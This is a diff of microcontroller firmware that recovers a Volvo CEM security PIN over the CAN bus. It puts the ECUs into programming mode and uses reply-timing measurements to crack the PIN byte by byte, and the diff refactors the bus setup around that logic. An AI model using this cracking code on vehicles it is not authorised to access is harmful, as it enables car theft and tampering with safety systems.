@@ -1,68 +1,10 @@
 /* SPDX-License-Identifier: GPL-3.0 */
 /*
- * Copyright (C) 2020 Vitaly Mayatskikh <v.mayatskih@gmail.com>
- *                    Christian Molson <christian@cmolabs.org>
- *                    Mark Dapoz <md@dapoz.ca>
+ * Copyright (C) 2020, 2021 Vitaly Mayatskikh <v.mayatskih@gmail.com>
+ *               2020 Christian Molson <christian@cmolabs.org>
+ *               2020 Mark Dapoz <md@dapoz.ca>
  *
  * This work is licensed under the terms of the GNU GPL, version 3.
- *
- * P1 tested settings:
- *        Teensy 4.0 with external CAN controllers
- *        SAMPLES = 5 Seems to work reliably
- *        CALC_BYTES = 4 does seem to work fine, 3 might be more reliable
- *        CPU SPEED: 600MHz (default)
- *        OPTIMIZE: Fastest (default)
- * 
- * P2 tested settings:
- *        Teensy 4.0 using internal and external CAN controllers
- *        SAMPLES = 30
- *        CALC_BYTES = 3
- *        NUM_LOOPS = 1000
- *        CPU SPEED: 600MHz (default)
- *        OPTIMIZE: Fastest (default)
- *
- * MCP2515 Library: https://github.com/vtl/CAN_BUS_Shield.git
- *
- *
- * Hardware selection:
- *
- * Several hardware variants are supported:
- *
- *  - Teensy 4.x with external MPC2515 CAN bus controllers
- *  - Teensy with internal dual CAN bus controllers
- *    - Only supported on Teensy 4.x and 3.6
- *  - Teensy with internal single CAN bus controller
- *    - Only supported on Teensy 3.1, 3.2 and 3.5
- *
- * The Teensy 4.0 configuration with the external MPC2515 controller is
- * described in the provided schematic.  Selecting MPC2515_HW as the
- * hardware configuration will utilize this hardware.
- *
- * The Teensy 4.x configuration uses the built-in CAN1 and CAN2 controllers.
- * CAN1 is used for the high-speed bus and CAN2 is used for the low-speed bus.
- * To enable the sampling of the high-speed CAN bus, the CAN1 receive pin
- * (CRX1, pin 37 on 4.1, pin 25 on 4.0) must be connected to digital input 2
- * (pin 4). 
- *
- * The Teensy 3.6 configuration uses the built-in CAN0 and CAN1 controllers.
- * CAN0 is used for the high-speed bus and CAN1 is used for the low-speed bus.
- * To enable the sampling of the high-speed CAN bus, the CAN0 receive pin
- * (pin 6) must be connected to digital input 2 (pin 4).
- *
- * The Teensy 3.1, 3.2, 3.5 configuration uses the built-in CAN1 controller
- * for access to the high-speed bus.  Since only one controller is present on
- * these models, it's not possible to connect to the low-speed bus.
- * To enable the sampling of the high-speed CAN bus, the CAN receive pin
- * must be connected to digital input 2.
- *
- * If the internal controllers are selected, the FlexCAN_T4 library must be
- * available in your library (should already be present as part of Teensyduino).
- * If it is missing it can be found here: https://github.com/tonton81/FlexCAN_T4
- *
- * External transcievers must be used to connect the Teensy to the CAN bus.
- *
- * Select TEENSY_CAN_HW as the hardware configuration to use the internal
- * CAN controller.
  *
  */
 
@@ -87,8 +29,8 @@
 
 /* P2 platform settings: S80, V70, XC70, S60, XC90 */
 
-const uint32_t shuffleOrder[] = { 3, 1, 5, 0, 2, 4 };
-//const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };
+//const uint32_t shuffleOrder[] = { 3, 1, 5, 0, 2, 4 };
+const uint32_t shuffleOrder[] = { 0, 1, 2, 3, 4, 5 };
 
 #elif defined(PLATFORM_P1)
 
@@ -116,10 +58,8 @@ uint32_t cem_reply_max;
 #define CAN_L_PIN    2          /* CAN Rx pin connected to digital pin 2 */
 
 #define CAN_500KBPS 500000      /* 500 Kbit speed */
+#define CAN_250KBPS 250000      /* 250 Kbit speed */
 #define CAN_125KBPS 125000      /* 125 Kbit speed */
-
-#define CAN_HS_SPEED CAN_500KBPS
-#define CAN_LS_SPEED CAN_125KBPS
 
 FlexCAN_T4<CAN1, RX_SIZE_256, TX_SIZE_16> can_hs;
 FlexCAN_T4<CAN2, RX_SIZE_256, TX_SIZE_16> can_ls;
@@ -137,7 +77,8 @@ typedef enum {
 
 #define CAN_MSG_SIZE    8       /* messages are always 8 bytes */
 
-#define CEM_ECU_ID      0x50    /* P1/P2 CEM uses ECU id 0x50 in the messages */
+#define CEM_HS_ECU_ID      0x50
+#define CEM_LS_ECU_ID      0x40
 
 #define PIN_LEN         6       /* a PIN has 6 bytes */
 
@@ -162,13 +103,6 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 
 /*******************************************************************************
  *
- * canMsgSend - send message on the CAN bus (MPC2515 version)
- *
- * Returns: N/A
- */
-
-/*******************************************************************************
- *
  * canMsgSend - send message on the CAN bus (FlexCAN_T4 version)
  *
  * Returns: N/A
@@ -179,7 +113,8 @@ void canMsgSend (can_bus_id_t bus, uint32_t id, uint8_t *data, bool verbose)
   CAN_message_t msg;
 
   if (verbose == true) {
-      printf ("---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+      printf ("CAN_%cS ---> ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+              bus == CAN_HS ? 'H' : 'L',
               id, data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7]);
    }
 
@@ -263,7 +198,8 @@ bool canMsgReceive (can_bus_id_t bus, uint32_t *id, uint8_t *data, bool wait, bo
   /* print the message we received */
 
   if (verbose == true) {
-    printf ("<--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+    printf ("CAN_%cS <--- ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n",
+            bus == CAN_HS ? 'H' : 'L',
             canId, pData[0], pData[1], pData[2], pData[3], pData[4], pData[5], pData[6], pData[7]);
   }
 
@@ -363,7 +299,7 @@ uint32_t profileCemResponse (void)
 
 bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
 {
-  uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_ECU_ID, 0xBE };
+  uint8_t  unlockMsg[CAN_MSG_SIZE] = { CEM_HS_ECU_ID, 0xBE };
   uint8_t  reply[CAN_MSG_SIZE];
   uint8_t *pMsgPin = unlockMsg + 2;
   uint32_t start, end, limit;
@@ -406,7 +342,7 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   while (!can_hs_event_msg_available && TSC < limit) {
     /* if the line is high, the CAN bus is either idle or transmitting a bit */
 
-    if (digitalRead (CAN_L_PIN))
+    if (digitalRead(CAN_L_PIN))
       continue;
 
     /* the CAN bus isn't idle, it's the start of the next bit */
@@ -447,38 +383,24 @@ bool cemUnlock (uint8_t *pin, uint8_t *pinUsed, uint32_t *latency, bool verbose)
   return reply[2] == 0x00;
 }
 
-/*******************************************************************************
- *
- * ecuPrintPartNumber - read an ECU's hardware part number
- *
- * Returns: N/A
- */
-
-void ecuPrintPartNumber (uint8_t ecuId)
+unsigned long ecu_read_part_number(can_bus_id_t bus, int id)
 {
-  uint32_t id;
-  uint8_t  data[CAN_MSG_SIZE] = { 0xff, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+  int _id;
+  uint8_t  data[CAN_MSG_SIZE] = { id, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
   bool     verbose = true;
+  unsigned long pn = 0;
 
-  printf ("Reading part number from ECU 0x%02x\n", ecuId);
+  printf("Reading part number from ECU 0x%02x on CAN_%cS\n", id, bus == CAN_HS ? 'H' : 'L');
 
-  /* set the ECU id in the message */
+  canMsgSend(bus, 0xffffe, data, verbose);
+  canMsgReceive(bus, &_id, data, true, verbose);
 
-  data[0] = ecuId;
-
-  /* send the message */
-
-  canMsgSend (CAN_HS, 0xffffe, data, verbose);
-
-  /* get the reply */
-
-  memset (data, 0, sizeof(data));
-  canMsgReceive(CAN_HS, &id, data, true, verbose);
-
-  printf ("Part Number: %02u%02u%02u%02u%02u%02u\n",
-          bcdToBin (data[2]), bcdToBin (data[3]),
-          bcdToBin (data[4]), bcdToBin (data[5]),
-          bcdToBin (data[6]), bcdToBin (data[7]));
+  for (int i = 0; i < 6; i++) {
+    pn *= 100;
+    pn += bcdToBin(data[2 + i]);
+  }
+  printf ("Part Number: %lu\n", pn);
+  return pn;
 }
 
 /*******************************************************************************
@@ -488,14 +410,16 @@ void ecuPrintPartNumber (uint8_t ecuId)
  * Returns: N/A
  */
 
-void progModeOn (void)
+void can_prog_mode(can_bus_id_t bus)
 {
   uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
   uint32_t time = 5000;
   uint32_t delayTime = 5;
   bool     verbose = true;
 
-  printf ("Putting all ECUs into programming mode.\n");
+  printf ("Putting all ECUs on CAN_%cS into programming mode.\n", bus == CAN_HS ? 'H' : 'L');
+
+  while(canMsgReceive(bus, NULL, NULL, false, false));
 
   /* broadcast a series of PROG mode requests */
 
@@ -503,13 +427,13 @@ void progModeOn (void)
     if ((time % 1000) == 0)
       k_line_keep_alive();
 
-    canMsgSend (CAN_HS, 0xffffe, data, verbose);
-    canMsgSend (CAN_LS, 0xffffe, data, verbose);
+    canMsgSend(bus, 0xffffe, data, verbose);
 
     verbose = false;
     time -= delayTime;
     delay (delayTime);
   }
+  while(canMsgReceive(bus, NULL, NULL, false, false));
 }
 
 /*******************************************************************************
@@ -845,7 +769,7 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
 
     /* send the unlock request to the CEM */
 
-    data[0] = CEM_ECU_ID;
+    data[0] = CEM_HS_ECU_ID;
     data[1] = 0xBE;
     data[2] = pinUsed[0];
     data[3] = pinUsed[1];
@@ -865,7 +789,7 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
     /* verify the response came from the CEM and is a successful reply to our request */
 
     if ((can_id == 3) &&
-      (data[0] == CEM_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
+      (data[0] == CEM_HS_ECU_ID) && (data[1] == 0xB9) && (data[2] == 0x00)) {
       printf ("PIN verified.\n");
     } else {
       printf ("PIN verification failed!\n");
@@ -875,45 +799,24 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
   printf ("done\n");
 }
 
-/*******************************************************************************
- *
- * flexCanInit - initialize Teensy internal CAN controllers
- *
- * Returns: N/A
- */
-
-void flexCanInit (void)
+void can_ls_init(int baud)
 {
-
-  /* high-speed CAN bus initialization */
-
-  can_hs.begin();
-  can_hs.setBaudRate(CAN_HS_SPEED);
-  can_hs.enableFIFO();
-  can_hs.enableFIFOInterrupt();
-  can_hs.setFIFOFilter(ACCEPT_ALL);
-  printf ("CAN high-speed init done.\n");
-
-#if defined(SHOW_CAN_STATUS)
-  can_hs.mailboxStatus ();
-#endif
-
-  /* low-speed CAN bus initialization */
-  can_ls.begin ();
-  can_ls.setBaudRate (CAN_LS_SPEED);
+  can_ls.begin();
+  can_ls.setBaudRate(baud);
   can_ls.enableFIFO();
   can_ls.enableFIFOInterrupt();
   can_ls.setFIFOFilter(ACCEPT_ALL);
   printf ("CAN low-speed init done.\n");
+}
 
-#if defined(SHOW_CAN_STATUS)
-  can_ls.mailboxStatus ();
-#endif
-
-  /* enable the time stamp counter */
-
-  ARM_DEMCR |= ARM_DEMCR_TRCENA;
-  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;
+void can_hs_init(int baud)
+{
+  can_hs.begin();
+  can_hs.setBaudRate(baud);
+  can_hs.enableFIFO();
+  can_hs.enableFIFOInterrupt();
+  can_hs.setFIFOFilter(ACCEPT_ALL);
+  printf ("CAN high-speed init done.\n");
 }
 
 /*******************************************************************************
@@ -953,10 +856,15 @@ void setup (void)
 {
   /* set up the serial port */
 
-  Serial.begin (115200);
+  Serial.begin(115200);
   Serial3.begin(10800); /* K-Line */
 
   delay (3000);
+
+  /* enable the time stamp counter */
+
+  ARM_DEMCR |= ARM_DEMCR_TRCENA;
+  ARM_DWT_CTRL |= ARM_DWT_CTRL_CYCCNTENA;
 
   /* set up the pin for sampling the CAN bus */
 
@@ -967,17 +875,14 @@ void setup (void)
   printf ("CPU Maximum Frequency:   %u\n", F_CPU);
   printf ("CPU Frequency:           %u\n", F_CPU_ACTUAL);
   printf ("Execution Rate:          %u cycles/us\n", clockCyclesPerMicrosecond ());
-#if defined(PLATFORM_P1)
-  printf ("Platform:                P1\n");
-#elif defined (PLATFORM_P2)
-  printf ("Platform:                P2\n");
-#else
-  printf ("Platform:                unknown\n");
-#endif
   printf ("PIN bytes to measure:    %u\n", CALC_BYTES);
   printf ("Number of samples:       %u\n", SAMPLES);
 
-  flexCanInit ();
+  can_ls_init(CAN_125KBPS);
+  can_prog_mode(CAN_LS);
+  long pn = ecu_read_part_number(CAN_LS, CEM_LS_ECU_ID);
+  can_hs_init(CAN_500KBPS);
+  can_prog_mode(CAN_HS);
   printf ("Initialization done.\n\n");
 }
 
@@ -991,22 +896,6 @@ void setup (void)
 void loop (void)
 {
   bool verbose = false;
-
-  /* drain any pending messages */
-
-  while(canMsgReceive(CAN_HS, NULL, NULL, false, false));
-
-  /* put all ECUs into programming mode */
-
-  progModeOn ();
-
-  /* drain any pending messages */
-
-  while(canMsgReceive (CAN_HS, NULL, NULL, false, false));
-
-  /* print the CEM's part number */
-
-  ecuPrintPartNumber (CEM_ECU_ID);
 
   /* try and crack the PIN */
 
